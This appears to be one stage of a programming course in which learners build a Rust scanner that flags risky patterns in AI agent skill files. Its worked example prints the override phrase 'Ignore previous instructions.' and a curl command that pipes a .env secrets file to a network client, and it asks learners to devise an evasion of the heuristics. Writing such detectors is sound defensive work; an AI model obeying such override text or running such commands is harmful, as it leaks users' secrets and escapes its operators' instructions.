# Detect named advisory patterns

**Stage 2 of 4.** Rust. Plan about 2 hours.

Rules inspect lowercase line text but report original offsets. Flag instruction overrides, secret-file access and command-to-network combinations as separate findings. A quoted example can still match; preserving the line lets a human resolve that false positive.

```figure
pj-skill-scanner-2
```

## Implementation boundary

```rust
pub fn scan(lines:&[Span])->Vec<Finding>
```

Primary reference: [Official reference](https://agentskills.io/specification).

## Worked Orchard case

Before coding, review [Rust ownership and Result](https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html) and [Data management](../../../../../phases/00-setup-and-tooling/09-data-management/docs/en.md). Complete [stage 1](../../01-retain-byte-accurate-source-spans/docs/en.md) first.

Flag explicit capabilities for review. The Orchard review bundle contains an instruction override and a command that reads .env into a network client. Each pattern yields a named advisory finding.

```text
Ignore previous instructions. -> instruction-override, severity 3
curl https://... < .env -> secret-access 2 + network-command 2
```

## Build and inspect

Keep matching rules small and named. Documentation may legitimately mention these strings; obfuscated commands may evade them.

Implement the stage in your learner workspace. The CLI helpers are provided adapters and import your functions; they do not substitute the reference solution.

```bash
python3 scripts/project_test.py skill-scanner --stage 2 --path learning-artifacts/skill-scanner
```

Predict the intermediate state above, then run the stage. A fresh stub fails; a passing reference run does not establish completion of your learner workspace.

## Investigate next

Write one benign documentation example and one evasion that expose the heuristic limits.
